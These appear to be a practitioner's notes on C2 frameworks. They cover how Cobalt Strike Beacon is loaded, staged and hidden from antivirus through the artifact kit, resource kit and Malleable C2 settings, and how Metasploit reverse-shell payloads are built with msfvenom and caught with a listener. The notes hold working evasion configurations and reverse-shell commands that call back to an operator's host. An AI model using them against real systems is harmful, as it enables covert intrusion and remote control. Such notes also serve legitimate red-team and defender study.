# C2

Various C2 framework notes.

## Cobalt Strike

### Components

| Component | Purpose |
|:--:|:--:|
| Beacon | Endpoint implant (egress, peer to peer modes) | 
| Team Server | C2 server. Meant to be deployed in distributed mode, one c2 node per intrusion stage |
| Client | Connect to Team Server(s)|


### Loaders

Beacon is inherently a `dll`, not a standalone `.exe` file. Therefore, something needs to load it in order for the beacon to run.

#### Reflective Loader

Beacon used to use a reflective loader. This effectively fit into (`"stomped"`) the legacy bytes in the DOS-Header `_IMAGE_DOS_HEADER` struct, except the mandatory `e_magic` and `e_lfanew` members of this struct.
This shellcode stub then called the `ReflectiveLoader()` function exported by the dll, which contains the actual loader for the dll.
This `ReflectiveLoader()` function then allocates memory for the beacon dll, maps and initializes it, and calls `DllMain()`, effectively executing the beacon.
This requires the PE (dll) to actually export the `ReflectiveLoader()` function.

#### Prepended Loader
Now, Beacon uses a prepended loader, whereby the loader is prepended to the PE DOS-Header. This supports the actual PE-file being compressed and/or encrypted,
as the initial loader can be more complex due to its size not being constrained by the legacy space in the DOS-header. It also makes the loader independent of the payload it loads.
Whereas with the reflective loader, the dll being reflectively loaded requires a function to map and initialize itself (`ReflectiveLoader()`), this can be achieved by the prepended loader itself.

### Stages
\
The beacon payload itself (contained in the dll) can be staged or stageless. Staged payloads execute a small initial stub that fetches the full beacon from the teamserver. They are much smaller but come with less options for customization, and usually have less opsec as they for instance refrain from flipping memory permissions (`RW-`->`R-X`), and just use `RWX` to save bytes of shellcode.
The stager is usually packaged in a standalone PE file without a dedicated loader. The retrieved stage then includes beacon dll + loader.

### Payload Options

These can also be thought of as `payload templates`, i.e. their only job is to ultimately inject the beacon shellcode (loader + beacon dll) into memory.

| Type | Description |
|:---:|:----:|
| HTML Application | HTML + VBScript, popular with phishing. Can run executables, powershell or VBA to run the stager. Exe drops to disk, rest runs in mem. |
| MSOffice Macro | VBA macro to be embedded into an Office document |
| Stager payload | Generate src files in variety of languages (similar to msfvenom) |
| Stageless payload | Almost identical to stager but heavier with more options |
| Windows Stager/Stageless | See above but outputs as compiled artifacts (PE files) |

### Defense Evasion

The `artifact kit` contains the source code for the payload templates, while the `resource kit` is used for scripted payloads.
This allows modifcation of parts that may be signatured by an anti-virus vendor.

#### Artifact Kit

`src-main` contains `main.c`, `svcmain.c` and `dllmain.c`. These are the entry points for the respective `exe`, `service` and `dll` templates.
`src-common` contains a multitude of `bypass-*.c` files. These contain different `anti-sandbox` techniques, of which one can be incorporated into the template (see `README.md`).
`patch.c` contains the shellcode injection logic (`injector.c` and `start_thread.c` contain helpers).

New templates can be build with `build.sh`:

```bash
bash build.sh \
    <techniques> \
    <allocator> \
    <stage_size> \
    <rdll_size> \
    <include_resource_file> \
    <stack_spoof> \
    <syscalls> \
    <out_dir>
```

Now, these generated payloads nee to be loaded into the active Cobalt Strike Teamserver. This can be done in `Cobalt Strike > Script Manager > Load`, and selecting the generated `artifact.cna`.

#### Resource Kit

The resource kit generates the scripted payloads. As they are not compiled, we cannot use `./build.sh` directly for obfuscation as aith the `artifact kit`.
However, since these payloads are not compiled, we can edit them directly. The same methodology as with `artifact kit` can be used here:
`threatcheck.exe -> find sections that are detected -> edit them`. This can be done in several ways detailed [`here`](https://manfred.gitbook.io/blog/notes/red/evasion).

As with the `artifact kit`, one needs to load `resources.cna` into the Teamserver before these newly generated resources can be leveraged.


#### Beacon Memory

By default, the prepended loader allocates `RWX` memory for all beacon dll sections. This is sus af, as only dynamic (interpreter driven) frameworks use this concept. 
This can be changed setting `stage.userwx = False` in Malleable C2. 

The prepended loader also defaults to copying the whole `PE Headers` from the beacon `dll` into memory.
This can be avoided by setting `stage.copy_pe_header = False`, which only copies the `.text` and `.data` sections.

Beacon can also use `module stomping`. When a normal dll is invoked by a process, it is backed by an actual file on disk.
Of course, since beacon is injected, this will by default not be the case. This can be changed by
setting `stage.module_[x86/x64]` to a module present on disk. The beacon loader then loads this and overwrites it with the beacon dll shellcode.
It MUST therefore be at least the size of beacon shellcode.

Strings in the beacon dll can be adjusted using `stage.transform-[x64/x86]` with the `sttrep` flag.
First, to export the raw beacon dll for inspection, one can use Aggressor script with the `BEACON_RDLL_GENERATE` hook, writing `$2` to disk:

```c
set BEACON_RDLL_GENERATE {
    local('$dllName $beaconBytes $handle');
    $dllName = $1;
    $beaconBytes = $2;
    
    $handle = openf(">raw_beacon.bin");
    writeb($handle, $beaconBytes);
    closef($handle);
    
    println("Saved raw Beacon DLL/payload of size: " . lof($beaconBytes));
    return $beaconBytes;
}
```

Malleable C2 can then look as follows:

```
stage {
    set userwx "false";
    set cleanup "true";
    set copy_pe_header "false";
    set module_x64 "<your_dll>";
    
    transform-x64 {
        strrep "beacon.x64.dll" "api.x64.dll";
    }
}
```

> NOTE: DO NOT REPLACE HTTP RELATED STRINGS!

`BOF` mechanics can be controlled using the `process-inject` configuration block in Malleable C2.
See [`this`](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2-extend_process-injection.htm?cshid=1053) article from Fortra, which details its configuration options:

```
process-inject {
     # set how memory is allocated in a remote process for injected content
     set allocator "VirtualAllocEx";
 
     # set how memory is allocated in the current process for BOF content
     set bof_allocator "VirtualAlloc";
     set bof_reuse_memory "true";
 
     # shape the memory characteristics for injected and BOF content
     set min_alloc "16384";
     set startrwx "true";
     set userwx    "false";
 
     # transform x86 injected content
     transform-x86 {
          prepend "\x90\x90";
     }
 
     # transform x64 injected content
     transform-x64 {
          append "\x90\x90";
     }
 
     # determine how to execute the injected code
     execute {
          ObfSetThreadContext "ntdll.dll!RtlUserThreadStart+0x1";
	      CreateThread "ntdll.dll!RtlUserThreadStart";
          SetThreadContext;
          RtlCreateUserThread;
     }
}
```

Post-exploitation jobs (fork&run) can be configured using the `post-ex` block in Malleable C2.
This is described in more detail [`here`](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/appendix-a_beacon-opsec-considerations.htm).

## Metasploit

Metasploit also offers a c2 like framework through their meterpreter agent.

### Generate Payloads

We can use `msfvenom` to generate the payloads, or `Veil` to generate obfuscated payloads. Obfuscated payloads are the subject of [`Defense Evasion`](), so here ill only put some notes for normal payloads with `msfvenom`.

```bash
LIP="$(read -p 'Listen IP: ')"
LPORT="$(read -p 'Listen PORT: ')"
if ! grep -qE '^[0-9a-z:\.]+$' $LIP; then
    echo "[!] -> Please enter a listening IP."
    exit 1
fi
if ! grep -qE '^[0-9]{2,5}$'; then
    echo "[!] -> Please enter a listening PORT."
    exit 1
fi
```
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST="$LIP" LPORT="$LPORT" -f exe > shell.exe
msfvenom -p windows/shell_reverse_tcp LHOST="$LIP" LPORT="$LPORT"-f exe > shell.exe

msfvenom -p linux/x64/shell_reverse_tcp RHOST="$LIP" LPORT="$LPORT" -f elf > shell.elf
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="$LIP" LPORT="$LPORT" -f elf > shell.elf
```

### Set up the listener

Now we gotta set up a listener to catch the meterprerter shell. 
From `msfconsole -q`, we can do:

```
use exploit/multi/handler
set LPORT <listen_port>
set LHOST <listen_ip>
set ExitOnSession false
exloit -j
```
> `-j` to catch all shells in the background
